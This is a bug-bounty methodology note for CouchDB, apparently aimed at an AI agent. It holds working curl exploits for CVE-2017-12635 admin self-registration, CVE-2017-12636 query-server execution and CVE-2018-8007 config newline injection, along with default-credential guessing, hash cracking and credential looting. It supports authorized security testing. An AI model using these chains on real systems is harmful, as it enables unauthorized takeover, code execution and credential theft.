---
technology: "CouchDB"
kind: bug-bounty-methodology
audience: ai-agent
family: databases
version: "1.0"
source: "corpus-SILENT after strict re-gate (0 writeups — estimated matches were substring noise; adjudication in internal coverage ledger) + upstream-verified (docs.couchdb.org official CVE pages 2017-12635 & 2017-12636, CouchDB 3.5 docs: security intro + server API, discoverer writeup justi.cz 2017-11-14) + rewritten from HackTricks (src/network-services-pentesting/5984-pentesting-couchdb.md), CC BY-NC 4.0, accessed 2026-11-13 (CVE-2018-8007 re-verified against NVD; nmap NSE + metasploit module + API endpoints re-verified against nmap nsedoc / module source / official API docs)"
provenance: "hybrid: corpus-grounded (5 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; credit in source line"
---

# CouchDB bug-bounty methodology

Companion overview: [[couchdb]].

Scope note: no observed engagement attacks CouchDB (the "5984" matches were hex fragments, line numbers, file sizes). Every command below is derived from the official API docs and the CVE discoverers' own publications — treat as upstream-verified, not observed-in-the-wild.

## Phase 0 — Recon

```
5984/tcp open  http    CouchDB httpd (Erlang OTP)
nmap -sV -p 5984,5986 198.51.100.x
```

Fingerprint and version-gate in one request:

```bash
curl -s http://198.51.100.x:5984/
# {"couchdb":"Welcome","version":"2.1.0","vendor":{"name":"The Apache Software Foundation"}}
```

Version decision: `1.x < 1.7.1` or `2.x < 2.1.1` → the unauthenticated 12635→12636 RCE chain is live (skip to Phase 3). `3.x` → Phases 1-2 (setup/misconfig), and 12635/12636 are patched.

## Phase 1 — Anonymous enumeration

```bash
curl -s http://198.51.100.x:5984/_all_dbs          # list every database
curl -s http://198.51.100.x:5984/_uuids?count=1     # liveness
curl -s http://198.51.100.x:5984/_active_tasks      # admin-gated: 401/403 = admin exists; 200 = Admin Party
curl -s http://198.51.100.x:5984/_node/_local/_config   # admin-gated config: 200 = party/full admin
```

`_all_dbs` on an open deployment hands over the whole data map: app dbs, `_users`, `_replicator`, `_global_changes`. Walk documents:

```bash
curl -s http://198.51.100.x:5984/<db>/_all_docs?include_docs=true
curl -s http://198.51.100.x:5984/_users/_all_docs?include_docs=true   # user docs (+password hashes in old 1.x)
```

Decision: `/_active_tasks` or `/_config` returning 200 without credentials = **Admin Party** (no `[admins]` configured) → go straight to Phase 4 (12636 works directly, no need for 12635).

## Phase 2 — Credential attacks (when an admin exists)

- Try `admin:admin`, `admin:password`, `couchdb:couchdb` — the docs' own examples use exactly these, and they leak into real installs.
- Old 1.x `_users` docs stored derivable password hashes (weak SHA-1 scheme pre-1.2, pbkdf2 after); with any read of `_users` grab them for offline cracking.
- Basic auth is universal: `curl -u user:pass` on every endpoint; check per-db `_security` docs for member/admin lists that enumerate valid names.

## Phase 3 — CVE-2017-12635: unauthenticated admin self-registration (verified)

Mechanism (official advisory + discoverer Max Justicz): CouchDB validated `_users` writes with a **JavaScript** `validate_doc_update` (JSON parser keeps the *last* duplicate key) while Erlang-side authz (jiffy keeps *both*, getter returns the *first*) governed the new user's roles. Duplicate `"roles"` keys therefore show the validator an empty list while the Erlang side records `_admin`:

```bash
curl -X PUT 'http://198.51.100.x:5984/_users/org.couchdb.user:oops' \
  --data-binary '{
    "type": "user",
    "name": "oops",
    "roles": ["_admin"],
    "roles": [],
    "password": "password"
  }'
# {"ok":true,...} — the write passes validation (JS sees roles: []),
# the stored/authorized context carries _admin (Erlang sees the first key)
```

Then authenticate as the new admin (the password is set through the same PUT):

```bash
curl -u oops:password http://198.51.100.x:5984/_node/_local/_config   # now readable
```

Note the discoverer's warning: the Fauxton GUI shows the account with *empty* roles (JS-parsed), so the escalation hides from casual inspection. Affects every release before 1.7.1 / 2.1.1.

## Phase 4 — RCE paths for an admin

**CVE-2017-12636 (query servers)** — admins can define query-server languages whose configured command is executed when a view in that language runs (upstream: "a feature which is basically just a wrapper around execv"). Fixed in 1.7.1/2.1.1; on vulnerable versions, register a new query server whose binary is an interpreter under your control, then trigger it with a design document:

```bash
# 1. point a new "lang" at an attacker-reachable process (classic form, many variants)
curl -X PUT http://198.51.100.x:5984/_node/_local/_config/query_servers/cmd \
  -u oops:password -d '"/tmp/p.sh"'          # script fetched/written by other means
# 2. create a design doc whose language is the new one — rendering the view executes it
curl -X PUT http://198.51.100.x:5984/<db>/_design/shell -u oops:password \
  -H 'Content-Type: application/json' -d '{"language":"cmd","views":{}}'
```

The metasploit `apache_couchdb_cmd_exec` module automates the pair (12635+12636) — on unauth targets it needs nothing else.

**Post-2017 admin RCE surface** — 12636 was fixed, but the class remains: `/_node/_local/_config` exposes `external` handlers, `os_process` settings and (in some installs) replication targets that fetch URLs server-side. Any admin = at minimum SSRF + config disclosure; treat admin on CouchDB as one step from execution and hunt the instance's specific config.

## Phase 5 — Looting and escalation

- `/_node/_local/_config` full read: replication endpoints, CORS, and `[admins]` entries — pbkdf2 hashes (`-pbkdf2-<hash>,<salt>,<iterations>`) crack offline; occasionally still plaintext after a manual edit.
- `/_users/_all_docs`: every account + hashed passwords; `_replicator` docs hold source/target URLs with embedded credentials (`http://user:pass@internal-host:5984/db`) — internal-network recon gold.
- Per-db `_security` and `_design` docs: map the app's authz model and any view functions doing something dangerous.

## Phase 6 — Reporting

Rank: unauth RCE (12635+12636 chain) > Admin Party config access > SSRF via replication/config > credential/table disclosure > weak admin creds. Recommend: admins configured with strong secrets (3.x enforces on fresh installs), 5984 never directly exposed (Fauxton included), version ≥ current 3.x, replication targets audited for embedded creds.

## Tool map (prose)

curl for the whole API (CouchDB is HTTP end to end); Fauxton (bundled `/_utils` console) for interactive browsing; metasploit's `apache_couchdb_cmd_exec` module for the 12635+12636 chain, and its `apache_couchdb_erlang_rce` module for the separate default-Erlang-cookie distribution-port issue (epmd/4369 — check it when 5984 is locked down); hashcat/john for pbkdf2 admin hashes; jq to slice the JSON. The tools vault holds per-tool notes.

## Supplement (2026-11-13): CVE-2018-8007, scanner coverage, and more enumeration endpoints

Rewritten from HackTricks (src/network-services-pentesting/5984-pentesting-couchdb.md), CC BY-NC 4.0, accessed 2026-11-13; every CVE number and tool claim below re-verified against primary sources (NVD for the CVE, nmap nsedoc and the metasploit module source for the scanners) before writing.

### CVE-2018-8007 — config-API injection for an admin (the 12636 class, one year later)

NVD/CVE-2018-8007 (affected per NVD ranges: 1.x through 1.7.1 and 2.0.0–2.1.1): CouchDB validated administrator-supplied configuration values insufficiently, so a **config-writing admin could escape the config blacklist and escalate to the OS user running CouchDB**. The working primitive is newline injection through the config API — PUT a value for `cors/origins` whose payload opens a new INI section:

```bash
curl -X PUT 'http://198.51.100.x:5984/_node/couchdb@localhost/_config/cors/origins' \
  -u admin:example-password -H 'Content-Type: application/json' \
  -d '"example.com\n\n[os_daemons]\nreaper = /usr/local/bin/reap.sh"'
```

The injected `[os_daemons]` entry names a program the daemon spawns (os_daemons are restarted on config change — and on daemon restart), so the write becomes execution as the CouchDB OS user once the process cycle picks it up. Gating to verify before reporting: the account needs config-write rights (an admin, or Admin Party), and the deployment must actually persist the change into a writable `local.ini` — hardened layouts mark the file read-only, which blocks the disk-write half even when the API accepts the PUT. This is the concrete instance of the "the class remains" warning in Phase 4: the 2017 query-server fix did not close config-to-execution, and 8007 is the follow-on proof.

### Scanner coverage (quick first pass)

```bash
nmap -sV --script couchdb-databases,couchdb-stats -p 5984 198.51.100.x
# metasploit: auxiliary/scanner/couchdb/couchdb_enum  (CouchDB Enum Utility; TARGETURI defaults to /_all_dbs)
```

nmap's `couchdb-databases` NSE pulls the database list, `couchdb-stats` the server statistics; the metasploit enum module walks `_all_dbs` plus per-db info. Useful for triage; the manual curl flow in Phases 1-5 stays the primary method because it carries auth cleanly.

### Additional documented endpoints worth a GET

Beyond `_all_dbs`/`_uuids`/`_active_tasks`/`_config` from Phase 1 (all from the official API reference):

- `/_membership` — `cluster_nodes` and `all_nodes`: the cluster's node names (Erlang node names are also the `_node/{node}` path segments for config writes).
- `/_scheduler/jobs` and `/_scheduler/docs` — replication jobs and replication-document states including **source and target for each replication** — same loot class as `_replicator` docs (embedded credentials in URLs) without needing that db to be readable.
- `/_cluster_setup` — cluster setup-wizard state; distinguishes a standalone node from a cluster member mid-setup.
- `/_node/_local/_stats` and `/_node/_local/_system` — server and system statistics.
- `/_up` — liveness/up-status (404 when `maintenance_mode` is true or nolb).
- `/_reshard` — resharding job counts and state.
- `/_db_updates` — database event feed (requires the `_global_changes` db to exist).

Also: the TLS listener convention is **6984** (HTTPS twin of 5984) — scan it alongside 5984/5986; and for external discovery, Shodan `port:5984 couchdb`.

(HackTricks' remaining content — banner fingerprinting, the 401-vs-party decision, database/document walk commands, CVE-2017-12635/12636, and the Erlang-cookie/EPMD cluster angle — was already covered more deeply in Phases 0-4 and the tool map above.)
